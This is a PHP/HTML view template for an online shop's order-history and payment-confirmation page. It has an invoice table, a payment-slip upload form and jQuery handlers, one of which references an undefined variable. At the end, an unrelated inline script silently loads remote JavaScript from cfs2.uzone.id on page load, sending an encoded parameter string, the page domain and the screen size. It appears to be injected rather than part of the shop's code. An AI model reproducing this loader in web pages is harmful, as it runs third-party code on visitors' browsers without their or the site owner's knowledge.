
<!doctype html>
<html lang="en">
<head>

	<meta charset="utf-8">
	<!--[if IE]>
		<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
	<![endif]-->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="">
	<meta name="author" content="">
	
	<title>Giani Gracio | Online Shop</title>
	
	<!-- Bootstrap Core CSS -->
	<link href="<?=base_url()?>assets/css/bootstrap.min.css" rel="stylesheet">
	
	<!-- Google Web Fonts -->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,700italic,700,400italic,300italic,300" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Abel" rel="stylesheet" type="text/css">
	
	<!-- CSS Files -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    
	<link href="<?=base_url()?>assets/css/stylecss.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/responsive.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/animate.min.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/settings.css" rel="stylesheet">
	
	<link href="<?=base_url()?>assets/css/owl.carousel.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/owl.theme.css" rel="stylesheet">
	
	
	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
	<script type="text/javascript" src="<?=base_url()?>assets/dist/eModal.min.js"></script>
	<!--[if lt IE 9]>
		<script src="js/ie8-responsive-file-warning.js"></script>
	<![endif]-->
	
	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
	
	<!-- Fav and touch icons -->
	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/fav-144.png">
	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="images/fav-114.png">
	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="images/fav-72.png">
	<link rel="apple-touch-icon-precomposed" href="images/fav-57.png">
	<link rel="shortcut icon" href="<?=base_url()?>assets/img/favicon.png">
	<style>
		.car-caption{
			position: absolute;
			z-index: 1;
			top: 20px;
			left: 300px;
		}
		.owl-carousel{
			display: block;
		}
		.owl-carousel .owl-stage-outer {
		    position: relative;
		    overflow: hidden;
		    -webkit-transform: translate3d(0px,0px,0px);
		}
	</style>
</head>
<body>

<?php $this->load->view('topheader')?>
<?php
$this->load->model('modeldb');
$data['kategori'] = $this->modeldb->allcategories(); 
$this->load->view('navbar2', $data);
?>

<!-- Main Container Starts -->
	<div class="main-container container">
	<!-- Breadcrumb Starts -->
		<ol class="breadcrumb">
			<li><a href="<?=base_url()?>">Home</a></li>
			<li class="active">Your Order History</li>
		</ol>
	<!-- Breadcrumb Ends -->
	<!-- Main Heading Starts -->
		<h2 class="main-heading text-center">
			History of Your Order
		</h2>
		
<?=$this->session->flashdata('pesan')?>
	<!-- Main Heading Ends -->
	<!-- history Table Starts -->
		<p>Your Account: <?=$this->session->userdata('email')?></p>
		<div class="table-responsive shopping-cart-table">
			<table class="table table-bordered">
				<thead>
					<tr>
						<td class="text-center">
							No.
						</td>
						<td class="text-center">
							Invoice ID
						</td>
						<td class="text-center">
							Invoice Date
						</td>
						<td class="text-center">
							Due Date
						</td>							
						<td class="text-center">
							Total Amount
						</td>
						<td class="text-center">
							Status
						</td>
						<td class="text-center">
							Action
						</td>
					</tr>
				</thead>
				<tbody>
				<?php if($history != FALSE){
					$i = 0;
					foreach($history as $row):
					$i++; 
					
				?>
					<tr>
						<td class="text-center">
							<?=$i?>
						</td>
						<td class="text-center">
						<!--data-toggle="modal" data-target="#detail" data-whatever="<?=$row->id?>"-->
							<a href="<?=base_url().'detail-order/'.$row->id?>">#<?=$row->id?></a>
						</td>
						<td class="text-center">
							<?=$row->date?>
						</td>	
						<td class="text-center">
							<?=$row->due_date?>
						</td>
						<td class="text-center">
							<?php
							$disc = $row->total * 0.25;
							$subtotal = $row->total - $disc
							?>
							Rp.<?=number_format($subtotal,0,',','.')?>
						</td>						
						<td class="text-center" id="stats">
							<?php if($row->status == 'Uncompleted'){ ?>
								<span class="label label-warning"><?=$row->status?></span>
							<?php }elseif($row->status == 'Confirmed'){ ?>
								<span class="label label-info"><?=$row->status?></span>
							<?php }elseif($row->status == 'Completed'){ ?>
								<span class="label label-success"><?=$row->status?></span>
							<?php }elseif($row->status == 'Canceled'){ ?>
								<span class="label label-danger"><?=$row->status?></span>
							<?php }else{ ?>
								<span class="label label-default"><?=$row->status?></span>
							<?php }?>
						</td>

						<td class="text-center">
			<a href="javascript:void(0)" title="Confirm Payment" class="btn btn-default tool-tip"  data-data="<?=$row->id?>" data-what="<?=$row->status?>">
								<i class="fa fa-credit-card"></i></a>
							
						</td>
					</tr>
					
					
					<?php endforeach; ?>
					<?php }else{ ?>
					<tr>
						<td colspan="6" class="text-center">No Shopping History... </td>
						<td class="text-center"><a href="<?=base_url()?>">Shop Now</a></td>
					</tr>
						
					<?php } ?>						
				</tbody>
				<tfoot>
					
				</tfoot>
			</table>				
		</div>
	<!-- history Table Ends -->
		<div class="row">
			<div class="col-md-8 col-md-offset-2">
<form id="frmpay"  enctype="multipart/form-data" class="form-horizontal" method="post" action="<?=base_url().'payment-success'?>" >
	              	<div class="form-group"> 
	                  <label class="col-sm-3 control-label">Invoice ID</label>
	                  <div class="col-sm-6">
						<input type="text" class="form-control" id="invid" required name="invoice_id" >
	                  </div>
	                </div>
	                <div class="form-group">
	                  <label class="col-sm-3 control-label">Amount Transfered</label>
	                  <div class="col-sm-6">
	                    <input type="text" class="form-control"  name="amount" required >
	                  </div>
	                </div>
	                <div class="form-group">
	                  <label class="col-sm-3 control-label">Payment Slip</label>
	                  <div class="col-sm-6">
	                    <input type="file" class="form-control"  name="namafile" required >
	                  </div>
	                </div>
	                <div class="form-group">
	                  <div class="col-sm-10 col-sm-offset-3">
	                    <button type="submit" id="pay" class="btn btn-main pull-left"  disabled>Confirm My Payment</button>
	                  </div>
	                </div>
            	</form>
        	</div>
		</div>
	</div>
<!-- Main Container Ends -->

<!--modal-->
<div class="modal fade" id="detail" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel">
	<div class="modal-dialog modal-lg" role="document">
    	<div class="modal-content">
      		<div class="modal-header">
		        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
		        <h2 class="modal-title text-center" id="exampleModalLabel">Detail Order By Invoice ID <u></u></h2>
      		</div>
      		<div class="modal-body">
      			<div class="row">
      				<div class="col-xs-12">
      					<div class="table-responsive">
      						<table id="tdetail" class="table table-bordered">
        						<thead>
									<tr>
										<th>#</th>
										<th>Image</th>
										<th>Barcode</th>
										<th>Product Name</th>
										<th>Qty</th>
										<th>Price</th>
										<th>Subtotal</th>
									</tr>
        						</thead>
        						<tbody>
        	
        						</tbody>
	        					<tfoot>
	        		
	        					</tfoot>
        					</table>	
      					</div>
      				</div>
      			</div>
      		</div>
    	</div><!-- /.modal-content -->
  	</div><!-- /.modal-dialog -->
</div>
<!-- /.modal -->
<!--modal-->
<?php
$data['kontak'] = $this->modeldb->setting(); 
$this->load->view('footer2', $data);
?>
<!-- JavaScript Files -->
<script>
    $(document).ready(function(){
      $("#detail").on("show.bs.modal", function(e) {
        var button = $(e.relatedTarget); // Button that triggered the modal
		var id = button.data('whatever');
		var modal = $(this);
		$.get('<?php echo base_url()?>order/detailorder/' + id, function( data ) {
			modal.find('.modal-title u').text(id);
          $("#tdetail tbody").html(data);
        });
		$.get('<?php echo base_url()?>order/detailorder2/' + id, function( data ) {
          $("#tdetail tfoot").html(data);
        });
      });
      
    });
    
    $(document).ready(function(){
    	$('#frmpay').hide();
    	$('.tool-tip').on('click', function(){
    		var id = $(this).attr('data-data');
    		$('#frmpay').toggle();
    		$('#invid').val(id);
    		
    	});
    });
    
    function paym(){
/*    	var formData = new FormData($(this)[0]);*/
		var data = $('#frmpay').serialize();	
		$.ajax({
			type:'post',
			url:"<?php echo base_url()?>order/payment/",
			data: dataString,
			cache: false,
			success:function(data){
				alert(data);
			}
		});
//		location.reload();
	}
	
	$(document).ready(function(){
		$('.tool-tip').on('click', function(){
			var x = $(this).attr('data-what');
			if(x == 'Uncompleted'){
				document.getElementById('pay').removeAttribute('disabled');
				return false;
			}else{
				document.getElementById('pay').setAttribute('disabled', 'disabled');
				return false;
			}
		});
	});
	
	function payment(){
		var data = new FormData($('#frmpay')[0]);
		
 		$.ajax({
        	type:"POST",
            url:"<?php echo base_url()?>order/payment/",
            data:data,
            mimeType: "multipart/form-data",
            contentType: false,
            cache: false,
            processData: false,
            success:function(data)
            {
            	if(data == 'false'){
					$.notify({
						icon: 'fa fa-close',
						message: "Try Again Later"
					},{
						type:'danger',
						allow_dismiss: false
					});
				}else{
					$.notify({
						icon: 'fa fa-check',
						message: "Thank You!!"
					},{
						type:'success',
						allow_dismiss: false
					});
				}
            }
       });
       location.reload();
	}
  </script>

<script src="<?=base_url()?>assets/js/owl.carousel.js"></script>
<script src="<?=base_url()?>assets/dist/bootstrap-notify.min.js"></script>

<script src="<?=base_url()?>assets/js/jquery.themepunch.tools.min.js"></script>
<script src="<?=base_url()?>assets/js/jquery.themepunch.revolution.min.js"></script>
<script src="<?=base_url()?>assets/js/bootstrap.min.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BVACIgr3hsRyvCuufJ0UY0Ry6vOpcfdILgkQH18InGx%2fUcog9Na%2bzvt62XBF0GiTs5cT%2fRnc9yyHNdD3hM7EN1WldthAneOKxH3QabFiBzHqYufa2ileo%2fYGKYMRH4JPlPpPVBpwgIi49o1saFojuiHlvG768iKZxqxOZb76iXcU2FCAJseC1PmhchNfOojdWjoxPe9XFe3ruVa4INas%2bPSak6XVGXxss1%2bs4xvaDy%2bhd%2bfDmAS7TFbNKGr6qk3GI89mhV3s8oMYktPJ2IN6EQxWNonS3SrxH8YbkETOE6bBV6UGdWrRJDSPy6CGIItTIgqA%2bpPPZPXkD5MiL9SsWVi6il8ZVvDOkRK%2b0hiuW%2bGC8D04XiK6dLSacRuprQlQX6jkTuFbEJfB%2fYUpDdQymClFL%2f3NA%2fcbxzwohmluX665NWk8yf6gEPjvKics98gg5TD%2bAgWpbFUysDkQFCgTdJri%2fpza3H3U19tJJ6UUgp6W9j40nnzJwTkgkxqqn9jYkCSDCsgEo0GvYk3L6yhsTfqnCUw5qA2%2bY7jQzhzzZ%2bhuYrAxZncZg5g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>